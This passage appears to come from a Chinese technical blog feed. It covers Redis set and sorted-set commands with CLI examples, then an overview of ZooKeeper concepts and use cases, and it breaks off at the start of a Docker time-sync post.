class="line"></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; sadd user_1 "<span class="number">3</span>" "<span class="number">4</span>" "<span class="number">5</span>" "<span class="number">6</span>"</span><br><span class="line">(integer) <span class="number">4</span></span><br><span class="line">#sunion 合并两个集合</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; sunion users user_1</span><br><span class="line"><span class="number">1</span>) "<span class="number">1</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">2</span>"</span><br><span class="line"><span class="number">3</span>) "<span class="number">3</span>"</span><br><span class="line"><span class="number">4</span>) "<span class="number">4</span>"</span><br><span class="line"><span class="number">5</span>) "<span class="number">5</span>"</span><br><span class="line"><span class="number">6</span>) "<span class="number">6</span>"</span><br><span class="line"></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; smembers users</span><br><span class="line"><span class="number">1</span>) "<span class="number">1</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">2</span>"</span><br><span class="line"><span class="number">3</span>) "<span class="number">3</span>"</span><br><span class="line"><span class="number">4</span>) "<span class="number">4</span>"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; smembers user_1</span><br><span class="line"><span class="number">1</span>) "<span class="number">3</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">4</span>"</span><br><span class="line"><span class="number">3</span>) "<span class="number">5</span>"</span><br><span class="line"><span class="number">4</span>) "<span class="number">6</span>"</span><br><span class="line">#sdiff 获取左集合的差集</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; sdiff users user_1</span><br><span class="line"><span class="number">1</span>) "<span class="number">1</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">2</span>"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; sdiff user_1 users</span><br><span class="line"><span class="number">1</span>) "<span class="number">5</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">6</span>"</span><br><span class="line"></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; sadd users "<span class="number">1</span>" "<span class="number">2</span>" "<span class="number">3</span>" "<span class="number">4</span>" "<span class="number">5</span>"</span><br><span class="line">(integer) <span class="number">5</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; sadd user_1 "<span class="number">3</span>" "<span class="number">4</span>" "<span class="number">5</span>" "<span class="number">6</span>" "<span class="number">7</span>"</span><br><span class="line">(integer) <span class="number">5</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; sdiff users user_1</span><br><span class="line"><span class="number">1</span>) "<span class="number">1</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">2</span>"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; sdiff k1 users user_1</span><br><span class="line">(empty list or <span class="built_in">set</span>)</span><br><span class="line">#sdiffstore 求差集，它将结果保存到 dest 集合，而不是简单地返回结果集。</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; sdiffstore k1 users user_1</span><br><span class="line">(integer) <span class="number">2</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; smembers k1</span><br><span class="line"><span class="number">1</span>) "<span class="number">1</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">2</span>"</span><br><span class="line">#sinter 获取两个集合的交集</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; sinter users user_1</span><br><span class="line"><span class="number">1</span>) "<span class="number">3</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">4</span>"</span><br><span class="line">#sinterstore 求交集，它将结果保存到 dest 集合，而不是简单地返回结果集。</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; sinterstore k2 users user_1</span><br><span class="line">(integer) <span class="number">3</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; smembers k2</span><br><span class="line"><span class="number">1</span>) "<span class="number">3</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">4</span>"</span><br><span class="line"><span class="number">3</span>) "<span class="number">5</span>"</span><br><span class="line"></span><br><span class="line">##SRANDMEMBER key [count]</span><br><span class="line">##如果命令执行时，只提供了 key 参数，那么返回集合中的一个随机元素。</span><br><span class="line">##从 Redis <span class="number">2</span>.<span class="number">6</span> 版本开始， SRANDMEMBER 命令接受可选的 count参数：如果count为正数，且小于集合基数,那么命令返回一</span><br><span class="line">##个包含count个元素的数组，数组中的元素各不相同。 如果 count 大于等于集合基数，那么返回整个集合。</span><br><span class="line">##如果 count 为负数，那么命令返回一个数组，数组中的元素可能会重复出现多次，而数组的长度为 count ##的绝对值。</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; srandmember users</span><br><span class="line">"<span class="number">4</span>"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; srandmember users <span class="number">2</span></span><br><span class="line"><span class="number">1</span>) "<span class="number">4</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">1</span>"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; srandmember users <span class="number">3</span></span><br><span class="line"><span class="number">1</span>) "<span class="number">2</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">4</span>"</span><br><span class="line"><span class="number">3</span>) "<span class="number">1</span>"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; srandmember users <span class="number">3</span></span><br><span class="line"><span class="number">1</span>) "<span class="number">2</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">4</span>"</span><br><span class="line"><span class="number">3</span>) "<span class="number">1</span>"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; srandmember users -<span class="number">3</span></span><br><span class="line"><span class="number">1</span>) "<span class="number">3</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">3</span>"</span><br><span class="line"><span class="number">3</span>) "<span class="number">1</span>"</span><br><span class="line"></span><br><span class="line">#SPOP 移除并返回集合中的一个随机元素。</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; spop users</span><br><span class="line">"<span class="number">4</span>"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; smembers users</span><br><span class="line"><span class="number">1</span>) "<span class="number">1</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">2</span>"</span><br><span class="line"><span class="number">3</span>) "<span class="number">3</span>"</span><br><span class="line"><span class="number">4</span>) "<span class="number">5</span>"</span><br><span class="line">#srem 删除指定的元素</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; srem users "fsdf"</span><br><span class="line">(integer) <span class="number">0</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; srem users "<span class="number">1</span>"</span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; smembers users</span><br><span class="line"><span class="number">1</span>) "<span class="number">2</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">3</span>"</span><br><span class="line"><span class="number">3</span>) "<span class="number">5</span>"</span><br><span class="line"></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; smembers users</span><br><span class="line"><span class="number">1</span>) "<span class="number">2</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">3</span>"</span><br><span class="line"><span class="number">3</span>) "<span class="number">5</span>"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; smembers user_1</span><br><span class="line"><span class="number">1</span>) "<span class="number">3</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">4</span>"</span><br><span class="line"><span class="number">3</span>) "<span class="number">5</span>"</span><br><span class="line"><span class="number">4</span>) "<span class="number">6</span>"</span><br><span class="line"><span class="number">5</span>) "<span class="number">7</span>"</span><br><span class="line">##SMOVE source destination member</span><br><span class="line">##将 member 元素从 source 集合移动到 destination 集合。</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; smove users user_1 "<span class="number">6</span>"</span><br><span class="line">(integer) <span class="number">0</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; smove users user_1 "<span class="number">2</span>"</span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; smembers users</span><br><span class="line"><span class="number">1</span>) "<span class="number">3</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">5</span>"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; smembers user_1</span><br><span class="line"><span class="number">1</span>) "<span class="number">2</span>"</span><br><span class="line"><span class="number">2</span>) "<span class="number">3</span>"</span><br><span class="line"><span class="number">3</span>) "<span class="number">4</span>"</span><br><span class="line"><span class="number">4</span>) "<span class="number">5</span>"</span><br><span class="line"><span class="number">5</span>) "<span class="number">6</span>"</span><br><span class="line"><span class="number">6</span>) "<span class="number">7</span>"</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>5、Sorted Set(有序集合)</li>
</ul>
</blockquote>
<p>Sorted Set和Set类型极为相似，它们都是字符串的集合，都不允许重复的成员出现在一个Set中。它们之间的主要差别是Sorted Set中的每一个成员都会有一个分数(score)与之关联，Redis正是通过分数来为集合中的成员进行从小到大的排序。然而需要额外指出的是，尽管Sorted Set中的成员必须是唯一的，但是分数(score)却是可以重复的。<br><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">#zadd key score member [score member...] </span><br><span class="line">#将一个或多个 member 元素及其 score 值加入到有序集 key 当中。</span><br><span class="line">#如果某个 member 已经是有序集的成员，那么更新这个 member 的 score 值，并通过重新插入这个 </span><br><span class="line">#member 元素，来保证该 member 在正确的位置上。</span><br><span class="line">#score 值可以是整数值或双精度浮点数。</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zadd users <span class="number">1</span>.<span class="number">0</span> "wang" <span class="number">2</span>.<span class="number">1</span> "li"</span><br><span class="line">(integer) <span class="number">2</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zmembers users</span><br><span class="line">#zscore key member 获取指定member的score值</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zscore users wang</span><br><span class="line">"<span class="number">1</span>"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zscore users li</span><br><span class="line">"<span class="number">2</span>.<span class="number">1000000000000001</span>"</span><br><span class="line"></span><br><span class="line">#ZCOUNT key min max</span><br><span class="line">#返回有序集 key 中， score 值在 min 和 max 之间(默认包括 score 值等于 min 或 max )的成员的数量。</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zcount users <span class="number">0</span> <span class="number">20</span></span><br><span class="line">(integer) <span class="number">2</span></span><br><span class="line"></span><br><span class="line">#ZRANGE key <span class="built_in">start</span> stop [WITHSCORES]</span><br><span class="line">#返回有序集 key 中，指定区间内的成员。</span><br><span class="line">#其中成员的位置按 score 值递增(从小到大)来排序。</span><br><span class="line">#具有相同 score 值的成员按字典序来排列。ZREVRANGE 刚好相反.</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zrange users <span class="number">0</span> <span class="number">20</span></span><br><span class="line"><span class="number">1</span>) "wang"</span><br><span class="line"><span class="number">2</span>) "li"</span><br><span class="line"></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zrange users <span class="number">0</span> <span class="number">20</span></span><br><span class="line"><span class="number">1</span>) "wang"</span><br><span class="line"><span class="number">2</span>) "li"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zadd users <span class="number">2</span>.<span class="number">1</span> "sun"</span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zrange users <span class="number">0</span> <span class="number">20</span></span><br><span class="line"><span class="number">1</span>) "wang"</span><br><span class="line"><span class="number">2</span>) "li"</span><br><span class="line"><span class="number">3</span>) "sun"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zadd users <span class="number">22</span> "zhang"</span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zrangebyscore users <span class="number">0</span> <span class="number">2</span></span><br><span class="line"><span class="number">1</span>) "wang"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zrangebyscore users <span class="number">0</span> <span class="number">20</span></span><br><span class="line"><span class="number">1</span>) "wang"</span><br><span class="line"><span class="number">2</span>) "li"</span><br><span class="line"><span class="number">3</span>) "sun"</span><br><span class="line"></span><br><span class="line"># ZRANGEBYSCORE key min max [WITHSCORES] [LIMIT offset count]</span><br><span class="line"># 返回有序集 key 中，所有 score 值介于 min 和 max 之间(包括等于 min 或 max )的成员。有序集成员按 # score 值递增(从小到大)次序排列。</span><br><span class="line">#具有相同 score 值的成员按字典序(lexicographical #order)来排列(该属性是有序集提供的，不需要额外的计算)。</span><br><span class="line">#可选的 LIMIT 参数指定返回结果的数量及区间(就像SQL中的 SELECT LIMIT offset, count )</span><br><span class="line">#，注意当offset 很大时，定位 offset 的操作可能需要遍历整个有序集，此过程最坏复杂度为 O(N).</span><br><span class="line">#ZRANGEBYSCORE刚好相反.</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zrangebyscore users <span class="number">0</span> <span class="number">20</span> withscores limit <span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span>) "li"</span><br><span class="line"><span class="number">2</span>) "<span class="number">2</span>.<span class="number">1000000000000001</span>"</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zrangebyscore users <span class="number">0</span> <span class="number">20</span> withscores limit <span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">1</span>) "li"</span><br><span class="line"><span class="number">2</span>) "<span class="number">2</span>.<span class="number">1000000000000001</span>"</span><br><span class="line"><span class="number">3</span>) "sun"</span><br><span class="line"><span class="number">4</span>) "<span class="number">2</span>.<span class="number">1000000000000001</span>"</span><br><span class="line">#ZRANK key member</span><br><span class="line">#返回有序集 key 中成员 member 的排名。其中有序集成员按 score 值递增(从小到大)顺序排列。</span><br><span class="line">#排名以 <span class="number">0</span> 为底，也就是说， score 值最小的成员排名为 <span class="number">0</span> 。</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zrank users li</span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zrank users sun</span><br><span class="line">(integer) <span class="number">2</span></span><br><span class="line"></span><br><span class="line">#ZREVRANK key member</span><br><span class="line">#返回有序集 key 中成员 member 的排名。其中有序集成员按 score 值递减(从大到小)排序。</span><br><span class="line">#排名以 <span class="number">0</span> 为底，也就是说， score 值最大的成员排名为 <span class="number">0</span> 。</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">36379</span>&gt; zrevrank users sun</span><br><span class="line">(integer) <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>至此，大部分常用命令已经操作完毕，可能会有部分遗漏命令，请自行学习。</p>
<p>参考资料:</p>
<blockquote>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/Redis" target="_blank" rel="noopener">Redis</a></li>
<li><a href="http://doc.redisfans.com/" target="_blank" rel="noopener">Redis命令参考</a></li>
<li><a href="https://en.wikipedia.org/wiki/Lexicographical_order" target="_blank" rel="noopener">字典排序</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>zookeeper基础</title>
    <url>/2018/05/28/distributed/zookeeper%20%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>ZooKeeper是一个分布式的,开放源码的分布式应用程序协调服务,是Google的Chubby一个开源的实现,是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件,提供的功能包括：配置维护、域名服务、分布式同步、组服务等。ZooKeeper的目标就是封装好复杂易出错的关键服务,将简单易用的接口和性能高效、功能稳定的系统提供给用户。<br>ZooKeeper提供了分布式独享锁、选举、队列的接口。<br><a id="more"></a></p>
<h1 id="zookeeper设计目标"><a href="#zookeeper设计目标" class="headerlink" title="zookeeper设计目标"></a>zookeeper设计目标</h1><blockquote>
<ul>
<li>简单</li>
</ul>
</blockquote>
<p>ZooKeeper允许分布式进程通过共享的层级命名空间相互协调,该命名空间的组织方式与标准文件系统类似。名称空间由数据寄存器组成,在ZooKeeper中称为znodes。与专为存储而设计的典型文件系统不同,ZooKeeper数据保存在内存中,这意味着ZooKeeper可以实现高吞吐量和低延迟数量。ZooKeeper实现非常重视高性能,高可用性,严格有序的访问。<br>ZooKeeper的性能方面意味着它可以在大型分布式系统中使用。可靠性方面使其不会成为单点故障。严格的排序意味着可以在客户端实现复杂的同步原语。</p>
<blockquote>
<ul>
<li>高可用</li>
</ul>
</blockquote>
<p>与它协调的分布式进程一样,ZooKeeper本身也可以在称为集合的一组主机上进行复制。<br>组成ZooKeeper服务的服务器必须彼此了解。<br>它们维护内存中的状态图像,以及持久性存储中的事务日志和快照。<br>只要大多数服务器可用,ZooKeeper服务就可用。<br>客户端连接到单个ZooKeeper服务器。<br>客户端维护TCP连接,通过该连接发送请求,获取响应,获取监视事件以及发送心跳。<br>如果与服务器的TCP连接中断,则客户端将连接到其他服务器。<br><img src="/2018/05/28/distributed/zookeeper 基础/zkservice.jpg" alt></p>
<blockquote>
<ul>
<li>有序</li>
</ul>
</blockquote>
<p>ZooKeeper使用反映ZooKeeper事务顺序的数字来标记每个更新。后续操作可以使用该顺序来实现更高级别的抽象,例如同步原语。</p>
<blockquote>
<ul>
<li>高效</li>
</ul>
</blockquote>
<p>它在“读取主导”工作负载中特别快。ZooKeeper应用程序在数千台计算机上运行,​​并且在读取比写入更常见的情况下表现最佳,比率大约为10：1。</p>
<h1 id="数据模型和命名空间"><a href="#数据模型和命名空间" class="headerlink" title="数据模型和命名空间"></a>数据模型和命名空间</h1><h2 id="数据模型和命名空间-1"><a href="#数据模型和命名空间-1" class="headerlink" title="数据模型和命名空间"></a>数据模型和命名空间</h2><p>ZooKeeper提供的名称空间非常类似于标准文件系统。名称是由斜杠（/）分隔的路径元素序列。ZooKeeper名称空间中的每个节点都由路径标识。</p>
<p><img src="/2018/05/28/distributed/zookeeper 基础/zknamespace.jpg" alt></p>
<blockquote>
<ul>
<li><p>每个子目录项如app1都被称作为znode,这个znode是被它所在的路径唯一标识,如c1这个znode的标识为/app1/c1.</p>
</li>
<li><p>znode可以有子节点目录,并且每个 znode 可以存储数据,注意EPHEMERAL 类型的目录节点不能有子节点目录.</p>
</li>
<li><p>znode是有版本的,每个znode中存储的数据可以有多个版本,也就是一个访问路径中可以存储多份数据.</p>
</li>
<li><p>znode可以是临时节点,一旦创建这个znode的客户端与服务器失去联系,这个znode也将自动删除, Zookeeper的客户端和服务器通信采用长连接方式,每个客户端和服务器通过心跳来保持连接,这个连接状态称为session,如果znode是临时节点,这个session失效, znode也就删除了.</p>
</li>
<li><p>znode的目录名可以自动编号,如 App1已经存在,再创建的话,将会自动命名为app2.</p>
</li>
<li><p>znode可以被监控,包括这个目录节点中存储的数据的修改,子节点目录的变化等,一旦变化可以通知设置监控的客户端,这个是Zookeeper的核心特性, Zookeeper的很多功能都是基于这个特性实现的,后面在具体的应用场景中会有实例介绍。 </p>
</li>
</ul>
</blockquote>
<h2 id="znode类型"><a href="#znode类型" class="headerlink" title="znode类型"></a>znode类型</h2><p>当前3.4.13版本的zookeeper的节点类型共有下面四种。</p>
<blockquote>
<ul>
<li>PERSISTENT</li>
</ul>
</blockquote>
<p>持久化目录节点,客户端与zookeeper断开连接后,该节点依旧存在.</p>
<blockquote>
<ul>
<li>PERSISTENT_SEQUENTIAL </li>
</ul>
</blockquote>
<p>持久化顺序编号目录节点,客户端与zookeeper断开连接后,该节点依旧存在,只是Zookeeper给该节点名称进行顺序编号；</p>
<blockquote>
<ul>
<li>EPHEMERAL </li>
</ul>
</blockquote>
<p>临时目录节点,客户端与zookeeper断开连接后,该节点被删除；</p>
<blockquote>
<ul>
<li>EPHEMERAL_SEQUENTIAL </li>
</ul>
</blockquote>
<p>临时顺序编号目录节点,客户端与zookeeper断开连接后,该节点被删除,只是Zookeeper给该节点名称进行顺序编号。 </p>
<h1 id="zookeeper中的角色"><a href="#zookeeper中的角色" class="headerlink" title="zookeeper中的角色"></a>zookeeper中的角色</h1><p>在zookeeper中有下面几种角色,以及每个角色的职责.</p>
<p><img src="/2018/05/28/distributed/zookeeper 基础/184622zzinniurv0v1tn8i.png" alt></p>
<h1 id="zookeeper工作原理"><a href="#zookeeper工作原理" class="headerlink" title="zookeeper工作原理"></a>zookeeper工作原理</h1><p>Zookeeper 的核心是原子广播,这个机制保证了各个Server之间的同步。实现这个机制的协议叫做Zab协议(Zookeeper Atomic Broadcast)。Zab协议有两种模式,它们分别是恢复模式（选主）和广播模式（同步）。当服务启动或者在领导者崩溃后,Zab就进入了恢复模式,当领导者被选举出来,且大多数Server完成了和 leader的状态同步以后,恢复模式就结束了。状态同步保证了leader和Server具有相同的系统状态。 </p>
<p>为了保证事务的顺序一致性,zookeeper采用了递增的事务id号（zxid）来标识事务。所有的提议（proposal）都在被提出的时候加上了zxid。实现中zxid是一个64位的数字,它高32位是epoch用来标识leader关系是否改变,每次一个leader被选出来,它都会有一个新的epoch,标识当前属于那个leader的统治时期。低32位用于递增计数。</p>
<h2 id="server的工作状态"><a href="#server的工作状态" class="headerlink" title="server的工作状态"></a>server的工作状态</h2><blockquote>
<ul>
<li>LOOKING</li>
</ul>
</blockquote>
<p>当前Server不知道leader是谁,正在选举</p>
<blockquote>
<ul>
<li>LEADING</li>
</ul>
</blockquote>
<p>当前Server即为选举出来的leader</p>
<blockquote>
<ul>
<li>FOLLOWING</li>
</ul>
</blockquote>
<p> leader已经选举出来,当前Server与之同步</p>
<blockquote>
<ul>
<li>OBSERVING</li>
</ul>
</blockquote>
<p>当前server为选举出的observer</p>
<h1 id="Watcher机制"><a href="#Watcher机制" class="headerlink" title="Watcher机制"></a>Watcher机制</h1><p>Watcher 监听机制是 Zookeeper 中非常重要的特性，我们基于 zookeeper 上创建的节点，可以对这些节点绑定监听事件，比如可以监听节点数据变更、节点删除、子节点状态变更等事件，通过这个事件机制，可以基于 zookeeper实现分布式锁、集群管理等功能。</p>
<p>watcher 特性：当数据发生变化的时候,zookeeper会产生一个 watcher 事件，并且会发送到客户端。但是客户端只会收到一次通知。如果后续这个节点再次发生变化，那么之前设置 watcher 的客户端不会再次收到消息.(watcher 是一次性的操作)。 可以通过循环监听去达到永久监听效果。</p>
<h1 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h1><p>zookeeper的节点有5种操作权限：</p>
<p>CREATE、READ、WRITE、DELETE、ADMIN 也就是 增、删、改、查、管理权限,这5种权限简写为crwda(即：每个单词的首字符缩写).<br>注：这5种权限中,delete是指对子节点的删除权限,其它4种权限指对自身节点的操作权限</p>
<p>身份的认证有4种方式：</p>
<blockquote>
<ul>
<li>world</li>
</ul>
</blockquote>
<p>默认方式,相当于全世界都能访问</p>
<blockquote>
<ul>
<li><p>Digest<br>即用户名:密码这种方式认证,这也是业务系统中最常用的</p>
</li>
<li><p>ip</p>
</li>
</ul>
</blockquote>
<p>使用Ip地址认证</p>
<blockquote>
<ul>
<li>Super</li>
</ul>
</blockquote>
<p>超级用户,和Digest类型,具有对zookeeper节点的任意操作权限。</p>
<h1 id="客户端工具"><a href="#客户端工具" class="headerlink" title="客户端工具"></a>客户端工具</h1><blockquote>
<ul>
<li>zkClient</li>
</ul>
</blockquote>
<ol>
<li><p>Zookeeper的Watcher是一次性的,每次触发之后都需要重新进行注册；</p>
</li>
<li><p>Session超时之后没有实现重连机制； </p>
</li>
<li><p>异常处理繁琐,Zookeeper提供了很多异常,对于开发人员来说可能根本不知道该如何处理这些异常信息； </p>
</li>
<li><p>只提供了简单的byte[]数组的接口,没有提供针对对象级别的序列化； </p>
</li>
<li><p>创建节点时如果节点存在抛出异常,需要自行检查节点是否存在；</p>
</li>
<li><p>删除节点无法实现级联删除；</p>
</li>
</ol>
<blockquote>
<ul>
<li>curator</li>
</ul>
</blockquote>
<p>Curator是Netflix公司开源的一套Zookeeper客户端框架,ZkClient一样,解决了非常底层的细节开发工作,包括连接重连、反复注册Watcher和NodeExistsException异常等。目前已经成为Apache的顶级项目。另外还提供了一套易用性和可读性更强的Fluent风格的客户端API框架。除此之外,Curator中还提供了Zookeeper各种应用场景的抽象封装。</p>
<h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>下面列举几个场景。</p>
<h2 id="配置中心"><a href="#配置中心" class="headerlink" title="配置中心"></a>配置中心</h2><p>zookeeper的节点可以保存数据,通过将配置信息存入node中。客户端通过watcher机制监控数据变化同时更业务系统的相关配置信息.</p>
<h2 id="注册中心"><a href="#注册中心" class="headerlink" title="注册中心"></a>注册中心</h2><p>注册中心通过zookeeper的临时节点来注册服务提供者和消费者等信息,当对应的服务宕机后对应的节点也从zookeeper中移除。这样就可以知道服务提供者、消费者的服务状态信息。</p>
<h2 id="集群管理"><a href="#集群管理" class="headerlink" title="集群管理"></a>集群管理</h2><p>服务集群管理主要涉及下面的几方面:</p>
<blockquote>
<ul>
<li>服务状态信息</li>
<li>服务上、下线信息</li>
<li>服务列表信息</li>
</ul>
</blockquote>
<p>这些都可以通过zookeeper的临时节点来判断服务的上下线以及节点的数量来判断集群的数量.</p>
<h2 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h2><p>在单机系统中实现锁是很容易的,通过Lock或synchronized可以很方便的实现。但是在分布式系统中实现对一组公共资源加锁仍然使用以前的方式却不能实现。所以引入了zookeeper,在zookeeper中通过创建临时节点来达到持有锁的目的,当服务处理完成业务后主动删除节点。其他服务判断当前临时节点是否存在来判断锁是否已被持有。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://zookeeper.apache.org/doc/r3.4.14/" target="_blank" rel="noopener">Apache Zookeeper官网</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title>docker容器时间同步</title>
    <url>/2019/03/14/devops/docker%E5%AE%B9%E5%99%A8%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5/</url>
    <content><![CDATA[<p>通常 docker 容器和宿主机的时间是不同的。<br>有一下三种方式来解决这个问题:<br><a id="more"></a></p>
<ol>
